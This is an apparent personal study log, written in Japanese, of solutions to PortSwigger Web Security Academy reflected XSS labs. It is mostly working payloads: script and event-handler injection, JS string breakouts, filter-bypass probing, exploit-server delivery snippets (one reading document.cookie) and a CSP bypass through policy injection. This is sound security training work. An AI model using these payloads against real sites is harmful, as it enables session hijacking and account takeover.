---
title: 'Cross-site scripting < Reflected >'
description: 'PortSwigger XSSの記録'
pubDate: 2026-02-09T10:00:00+09:00
category: 'PortSwigger'
tags: ['PortSwigger', 'Web', 'XSS']
---

# Cross-site scripting < Reflected > - PortSwigger

## Lab
### Reflected XSS into HTML context with nothing encoded
```text
GET /?search=<script>alert(1)</script>
```

### Reflected XSS into attribute with angle brackets HTML-encoded
空のまま送信すると発火する  
"onmouseover="alert(1)こっちはホバーするだけで発火する

```text
GET /?search=" required oninvalid="alert(1)
```
```html
<section class=search>
  <form action=/ method=GET>
    <input type=text placeholder='Search the blog...' name=search value="aaa">
    <button type=submit class=button>Search</button>
  </form>
</section>
---
<section class=search>
  <form action=/ method=GET>
    <input type=text placeholder='Search the blog...' name=search value="" required oninvalid="alert(1)">
    <button type=submit class=button>Search</button>
  </form>
</section>
```

### Reflected XSS into a JavaScript string with angle brackets HTML encoded
```text
GET /?search=';alert(1);//
```
```html
<script>
  var searchTerms = 'a';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
---
<script>
  var searchTerms = '';alert(1);//';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

### Reflected DOM XSS
`var searchResultsObj = {"results":[],"searchTerm":"aaa" - alert(1)}`  
`-alert`とすることで式として処理される  
`var searchResultsObj = {"results":[],"searchTerm":"aaa"; alert(1);};`  
`;`を使用することで文法エラーになる

```text
GET /?search=\"-alert(1)} //
```
- `"a`
  - `{"results":[],"searchTerm":"\"a"}`
- `\"} a`
  - `{"results":[],"searchTerm":"\\"} a"}`
- `\"; alert(1);} //`
  - `{"results":[],"searchTerm":"\\"; alert(1);} //"}`
- `\"-alert(1)} //`
  - `{"results":[],"searchTerm":"\\"-alert(1)} //"}`
```js
function search(path) {
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      eval('var searchResultsObj = ' + this.responseText);
      displaySearchResults(searchResultsObj);
    }
  };
  xhr.open("GET", path + window.location.search);
  xhr.send();
```

### Reflected XSS into HTML context with most tags and attributes blocked
html tagがブロックされており、burp intruderでどれがヒットするか調べる

- `<&&>`: body
- `<body%20&&=1>`: onresize
  - 複数ヒットしたが有効そうなのが`onresize`,`onscrollend`

`?search=<body+onresize%3Dprint%28%29>`動作確認できた、exploit serverで実行する  
iframeのonload=style.widthをつかうとロードした時にリサイズしてくれる

```text
<iframe src="https://challenge-host/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload="this.style.width='100px'"></iframe>
```

### Reflected XSS into HTML context with all tags blocked except custom ones
xssタグを作成してexploit serverで実行する  
iframeを使っていたが`X-Frame-Options: SAMEORIGIN`が追加されており、別の手段が必要

- `<xss onfocus=alert(1) autofocus tabindex=1>`

```text
<script>
  location = "https://challenge-host/?search=%3Cxss+onfocus%3Dalert%28document.cookie%29+autofocus+tabindex%3D1%3E";
</script>
```

### Reflected XSS with some SVG markup allowed

- `<svg &&=1>`: onbegin
  - svgに使えるeventsを探していて`onbegin`のみ許可されていた
- `<&&>`: animatetransform
  - `svg`かつ`onbegin`が使えそうなものはanimate&set系なのでそれに絞って調査

```test
<svg><animatetransform onbegin=alert(1)>
```

### Reflected XSS in canonical link tag
SEO対策などで加えられるcanonical linkの扱い不備によりxssが発火する  
特定のブラウザでは`Shift + Alt + x`でaccesskeyが起動しclickした処理になる

```text
?'accesskey='x'onlick='alert(1)
```
```html
<link rel="canonical" href='https://0a4b00a8049782278195ed0b00300006.web-security-academy.net/?'accesskey='x'onlick='alert(1)'/>
```

### Reflected XSS into a JavaScript string with single quote and backslash escaped

```text
</script><script>alert(1)</script>
```
```html
<script>
  var searchTerms = '</script><script>alert(1)</script>';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
>`-`をつけることで式として処理される

```text
\'-alert(1)//
```
```html
<script>
  var searchTerms = '\\'-alert(1)//';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
`${}`これが有効  
`${name}`これは定義された変数が呼び出される  
`${alert(1)}`これは関数として実行される

```text
${alert(1)}
```
```html
<script>
  var message = `0 search results for '\u0027alert(1)\u003cscript\u003e${alert(1)}'`;
  document.getElementById('searchMessage').innerText = message;
</script>
```

### Reflected XSS with event handlers and href attributes blocked
- `<a>`
- `<animate>`
- `<image>` 
- `<svg>`
- `<title>`

javascript:alert(1)だけならfilterかかってないけど、href=javascript:alert(1)にすると引っかかる  
aタグだけだと成立しないので複数構成する  
textタグがないとclickするところがないのでダメかも
```text
<svg><a><animate attributeName="href" values="javascript:alert(1)" /><text>Click me</text></a></svg>
```

### Reflected XSS protected by CSP, with CSP bypass
Payloadを実行するとcsp-report?tokenというものが実行される。  
script-src-elemはscript-srcよりも優先され、unsafe-inlineをつけることでhtml内に直接書いたjavasciptを許可する

- default-src 'self': 外部画像、API、iframeなどその他全部デフォルト制限
- object-src 'none': プラグイン完全禁止(フレームワーク系のやつ)
- script-src 'self': inline javascriptの禁止
- style-src 'self': CSS経由の攻撃を止める

優先順位: script-src-elem > script-src-attr > script-src > default-src

```text
?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```
```json
{
  "csp-report":
  {
    "document-uri":"https://challenge.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E","referrer":"https://challenge.web-security-academy.net/?search=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%26token%3D%3Bscript-src-elem+%27unsafe-inline%27",
    "violated-directive":"script-src-elem",
    "effective-directive":"script-src-elem",
    "original-policy":"default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=","disposition":"enforce",
    "blocked-uri":"inline",
    "line-number":46,
    "source-file":"https://challenge.web-security-academy.net/",
    "status-code":200,
    "script-sample":""
  }
}
```
```json
{
  "csp-report":
  {
    "document-uri":"https://challenge.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27",
    "referrer":"",
    "violated-directive":"script-src-elem",
    "effective-directive":"script-src-elem",
    "original-policy":"default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'",
    "disposition":"enforce",
    "blocked-uri":"https://challenge.web-security-academy.net/resources/labheader/js/labHeader.js","status-code":200,"script-sample":""
  }
}
```